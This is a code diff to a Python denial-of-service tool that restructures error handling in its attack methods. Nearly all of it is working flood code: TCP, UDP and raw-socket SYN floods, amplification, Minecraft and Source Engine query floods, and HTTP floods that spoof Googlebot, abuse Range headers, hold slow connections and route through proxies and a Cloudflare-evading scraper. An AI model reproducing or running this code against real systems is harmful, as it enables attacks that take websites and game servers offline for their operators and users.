@@ -150,19 +150,14 @@ class Layer4:
 
         try:
             with socket(AF_INET, SOCK_STREAM) as s:
-                try:
-                    s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-                    s.connect(self._target)
-                except Exception:
-                    requests_sent = requests_sent - 1
-                    requests_failed = requests_failed + 1
-                    pass
-
+                s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+                s.connect(self._target)
                 while s.send(randbytes(1024)):
                     continue
-
         except Exception:
             s.close()
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
 
 
 def MINECRAFT(self) -> None:
@@ -171,20 +166,15 @@ def MINECRAFT(self) -> None:
 
     try:
         with socket(AF_INET, SOCK_STREAM) as s:
-            try:
-                s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-                s.connect(self._target)
-            except Exception:
-                requests_sent = requests_sent - 1
-                requests_failed = requests_failed + 1
-                pass
-
+            s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+            s.connect(self._target)
             s.send(b'\x0f\x1f0\t' + self._target[0].encode() + b'\x0fA')
-
             while s.send(b'\x01'):
                 s.send(b'\x00')
     except Exception:
         s.close()
+        requests_sent = requests_sent - 1
+        requests_failed = requests_failed + 1
 
 
 def UDP(self) -> None:
@@ -193,20 +183,12 @@ def UDP(self) -> None:
 
     try:
         with socket(AF_INET, SOCK_DGRAM) as s:
-            try:
-                if not s.sendto(randbytes(1024), self._target):
-                    requests_sent = requests_sent - 1
-                    requests_failed = requests_failed + 1
-                    pass
-            except Exception:
-                requests_sent = requests_sent - 1
-                requests_failed = requests_failed + 1
-                pass
-
             while s.sendto(randbytes(1024), self._target):
                 continue
     except Exception:
         s.close()
+        requests_sent = requests_sent - 1
+        requests_failed = requests_failed + 1
 
 
 def SYN(self) -> None:
@@ -215,21 +197,14 @@ def SYN(self) -> None:
 
     try:
         with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
-            try:
-                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-                if not s.sendto(self._genrate_syn(), self._target):
-                    requests_sent = requests_sent - 1
-                    requests_failed = requests_failed + 1
-                    pass
-            except Exception:
-                requests_sent = requests_sent - 1
-                requests_failed = requests_failed + 1
-                pass
+            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
 
             while s.sendto(self._genrate_syn(), self._target):
                 continue
     except Exception:
         s.close()
+        requests_sent = requests_sent - 1
+        requests_failed = requests_failed + 1
 
 
 def AMP(self) -> None:
@@ -239,21 +214,12 @@ def AMP(self) -> None:
     try:
         with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-
-            try:
-                if not s.sendto(*next(self._amp_payloads)):
-                    requests_sent = requests_sent - 1
-                    requests_failed = requests_failed + 1
-                    pass
-            except Exception:
-                requests_sent = requests_sent - 1
-                requests_failed = requests_failed + 1
-                pass
-
             while s.sendto(*next(self._amp_payloads)):
                 continue
     except Exception:
         s.close()
+        requests_sent = requests_sent - 1
+        requests_failed = requests_failed + 1
 
 
 def VSE(self) -> None:
@@ -262,22 +228,13 @@ def VSE(self) -> None:
 
     try:
         with socket(AF_INET, SOCK_DGRAM) as s:
-            try:
-                if not s.sendto((b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
-                                 b'\x20\x51\x75\x65\x72\x79\x00'), self._target):
-                    requests_sent = requests_sent - 1
-                    requests_failed = requests_failed + 1
-                    pass
-            except Exception:
-                requests_sent = requests_sent - 1
-                requests_failed = requests_failed + 1
-                pass
-
             while s.sendto((b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                             b'\x20\x51\x75\x65\x72\x79\x00'), self._target):
                 continue
     except Exception:
         s.close()
+        requests_sent = requests_sent - 1
+        requests_failed = requests_failed + 1
 
 
 def _genrate_syn(self) -> bytes:
@@ -460,12 +417,8 @@ class HttpFlood:
                                                 ) % ProxyTools.Random.rand_str(512))[:-2]
         try:
             with self.open_connection() as s:
-                try:
-                    for _ in range(self._rpc):
-                        s.send(payload)
-                except Exception:
-                    s.close()
-                    pass
+                for _ in range(self._rpc):
+                    s.send(payload)
         except Exception:
             s.close()
             global requests_sent
@@ -482,12 +435,8 @@ class HttpFlood:
                                                                ProxyTools.Random.rand_str(32)))
         try:
             with self.open_connection() as s:
-                try:
-                    for _ in range(self._rpc):
-                        s.send(payload)
-                except Exception:
-                    s.close()
-                    pass
+                for _ in range(self._rpc):
+                    s.send(payload)
         except Exception:
             s.close()
             global requests_sent
@@ -499,12 +448,8 @@ class HttpFlood:
         payload: bytes = self.generate_payload("Range: bytes=0-,%s" % ",".join("5-%d" % i for i in range(1, 1024)))
         try:
             with self.open_connection() as s:
-                try:
-                    for _ in range(self._rpc):
-                        s.send(payload)
-                except Exception:
-                    s.close()
-                    pass
+                for _ in range(self._rpc):
+                    s.send(payload)
         except Exception:
             s.close()
             global requests_sent
@@ -525,12 +470,8 @@ class HttpFlood:
                                                      ProxyTools.Random.rand_str(64)))[:-2]
         try:
             with self.open_connection() as s:
-                try:
-                    for _ in range(self._rpc):
-                        s.send(payload)
-                except Exception:
-                    s.close()
-                    pass
+                for _ in range(self._rpc):
+                    s.send(payload)
         except Exception:
             s.close()
             global requests_sent
@@ -541,12 +482,8 @@ class HttpFlood:
     def PPS(self) -> None:
         try:
             with self.open_connection() as s:
-                try:
-                    for _ in range(self._rpc):
-                        s.send(self._defaultpayload)
-                except Exception:
-                    s.close()
-                    pass
+                for _ in range(self._rpc):
+                    s.send(self._defaultpayload)
         except Exception:
             s.close()
             global requests_sent
@@ -558,12 +495,8 @@ class HttpFlood:
         payload: bytes = self.generate_payload()
         try:
             with self.open_connection() as s:
-                try:
-                    for _ in range(self._rpc):
-                        s.send(payload)
-                except Exception:
-                    s.close()
-                    pass
+                for _ in range(self._rpc):
+                    s.send(payload)
         except Exception:
             s.close()
             global requests_sent
@@ -575,31 +508,27 @@ class HttpFlood:
         payload: bytes = self.generate_payload()
         try:
             with self.open_connection() as s:
-                try:
-                    s.send(str.encode(
-                        "GET /robots.txt HTTP/1.1\r\n"
-                        "Host: %s\r\n" % self._target.raw_authority +
-                        "Connection: Keep-Alive\r\n"
-                        "Accept: text/plain,text/html,*/*\r\n"
-                        "User-Agent: %s\r\n" % randchoice(google_agents) +
-                        "Accept-Encoding: gzip,deflate,br\r\n\r\n"
-                    ))
-                    s.send(str.encode(
-                        "GET /sitemap.xml HTTP/1.1\r\n"
-                        "Host: %s\r\n" % self._target.raw_authority +
-                        "Connection: Keep-Alive\r\n"
-                        "Accept: */*\r\n"
-                        "From: googlebot(at)googlebot.com\r\n"
-                        "User-Agent: %s\r\n" % randchoice(google_agents) +
-                        "Accept-Encoding: gzip,deflate,br\r\n"
-                        "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9), ProxyTools.Random.rand_str(4)) +
-                        "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n"
-                    ))
-                    for _ in range(self._rpc):
-                        s.send(payload)
-                except Exception:
-                    s.close()
-                    pass
+                s.send(str.encode(
+                    "GET /robots.txt HTTP/1.1\r\n"
+                    "Host: %s\r\n" % self._target.raw_authority +
+                    "Connection: Keep-Alive\r\n"
+                    "Accept: text/plain,text/html,*/*\r\n"
+                    "User-Agent: %s\r\n" % randchoice(google_agents) +
+                    "Accept-Encoding: gzip,deflate,br\r\n\r\n"
+                ))
+                s.send(str.encode(
+                    "GET /sitemap.xml HTTP/1.1\r\n"
+                    "Host: %s\r\n" % self._target.raw_authority +
+                    "Connection: Keep-Alive\r\n"
+                    "Accept: */*\r\n"
+                    "From: googlebot(at)googlebot.com\r\n"
+                    "User-Agent: %s\r\n" % randchoice(google_agents) +
+                    "Accept-Encoding: gzip,deflate,br\r\n"
+                    "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9), ProxyTools.Random.rand_str(4)) +
+                    "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n"
+                ))
+                for _ in range(self._rpc):
+                    s.send(payload)
         except Exception:
             s.close()
             global requests_sent
@@ -611,12 +540,8 @@ class HttpFlood:
         payload: bytes = self.generate_payload()
         try:
             with self.open_connection() as s:
-                try:
-                    while s.send(payload) and s.recv(1):
-                        continue
-                except Exception:
-                    s.close()
-                    pass
+                while s.send(payload) and s.recv(1):
+                    continue
         except Exception:
             s.close()
             global requests_sent
@@ -628,12 +553,8 @@ class HttpFlood:
         payload: bytes = self.generate_payload()
         try:
             with self.open_connection() as s:
-                try:
-                    for _ in range(min(self._rpc, 5)):
-                        s.send(payload)
-                except Exception:
-                    s.close()
-                    pass
+                for _ in range(min(self._rpc, 5)):
+                    s.send(payload)
         except Exception:
             s.close()
             global requests_sent
@@ -647,16 +568,11 @@ class HttpFlood:
             pro = randchoice(self._proxies)
         try:
             with create_scraper() as s:
-                try:
-                    for _ in range(self._rpc):
-                        if pro:
-                            s.get(self._target.human_repr(), proxies=pro.asRequest())
-                            continue
-
-                        s.get(self._target.human_repr())
-                except Exception:
-                    s.close()
-                    pass
+                for _ in range(self._rpc):
+                    if pro:
+                        s.get(self._target.human_repr(), proxies=pro.asRequest())
+                        continue
+                    s.get(self._target.human_repr())
         except Exception:
             s.close()
             global requests_sent
@@ -669,12 +585,8 @@ class HttpFlood:
         try:
             with self.open_connection() as s:
                 sleep(5.01)
-                try:
-                    for _ in range(self._rpc):
-                        s.send(payload)
-                except Exception:
-                    s.close()
-                    pass
+                for _ in range(self._rpc):
+                    s.send(payload)
         except Exception:
             s.close()
             global requests_sent
@@ -686,13 +598,9 @@ class HttpFlood:
         payload: bytes = self.generate_payload()
         try:
             with self.open_connection() as s:
-                try:
-                    for _ in range(self._rpc):
-                        sleep(max(self._rpc / 1000, 1))
-                        s.send(payload)
-                except Exception:
-                    s.close()
-                    pass
+                for _ in range(self._rpc):
+                    sleep(max(self._rpc / 1000, 1))
+                    s.send(payload)
         except Exception:
             s.close()
             global requests_sent
@@ -703,17 +611,13 @@ class HttpFlood:
     def DGB(self):
         try:
             with create_scraper() as s:
-                try:
-                    for _ in range(min(self._rpc, 5)):
-                        sleep(min(self._rpc, 5) / 100)
-                        if self._proxies:
-                            pro = randchoice(self._proxies)
-                            s.get(self._target.human_repr(), proxies=pro.asRequest())
-                            continue
-                        s.get(self._target.human_repr())
-                except Exception:
-                    s.close()
-                    pass
+                for _ in range(min(self._rpc, 5)):
+                    sleep(min(self._rpc, 5) / 100)
+                    if self._proxies:
+                        pro = randchoice(self._proxies)
+                        s.get(self._target.human_repr(), proxies=pro.asRequest())
+                        continue
+                    s.get(self._target.human_repr())
         except Exception:
             s.close()
             global requests_sent
@@ -729,12 +633,8 @@ class HttpFlood:
         payload = str.encode(f"{payload}\r\n")
         try:
             with self.open_connection() as s:
-                try:
-                    for _ in range(self._rpc):
-                        s.send(payload)
-                except Exception:
-                    s.close()
-                    pass
+                for _ in range(self._rpc):
+                    s.send(payload)
         except Exception:
             s.close()
             global requests_sent
@@ -762,12 +662,8 @@ class HttpFlood:
         payload = str.encode(f"{payload}\r\n")
         try:
             with self.open_connection() as s:
-                try:
-                    for _ in range(self._rpc):
-                        s.send(payload)
-                except Exception:
-                    s.close()
-                    pass
+                for _ in range(self._rpc):
+                    s.send(payload)
         except Exception:
             s.close()
             global requests_sent
@@ -784,12 +680,8 @@ class HttpFlood:
         payload = str.encode(f"{payload}\r\n")
         try:
             with self.open_connection() as s:
-                try:
-                    for _ in range(self._rpc):
-                        s.send(payload)
-                except Exception:
-                    s.close()
-                    pass
+                for _ in range(self._rpc):
+                    s.send(payload)
         except Exception:
             s.close()
             global requests_sent
@@ -801,17 +693,13 @@ class HttpFlood:
         payload: bytes = self.generate_payload()
         try:
             with self.open_connection() as s:
-                try:
-                    for _ in range(self._rpc):
-                        s.send(payload)
-                    while s.send(payload) and s.recv(1):
-                        for i in range(self._rpc):
-                            s.send(str.encode("X-a: %d\r\n" % randint(1, 5000)))
-                            sleep(self._rpc / 15)
-                        break
-                except Exception:
-                    s.close()
-                    pass
+                for _ in range(self._rpc):
+                    s.send(payload)
+                while s.send(payload) and s.recv(1):
+                    for i in range(self._rpc):
+                        s.send(str.encode("X-a: %d\r\n" % randint(1, 5000)))
+                        sleep(self._rpc / 15)
+                    break
         except Exception:
             s.close()
             global requests_sent
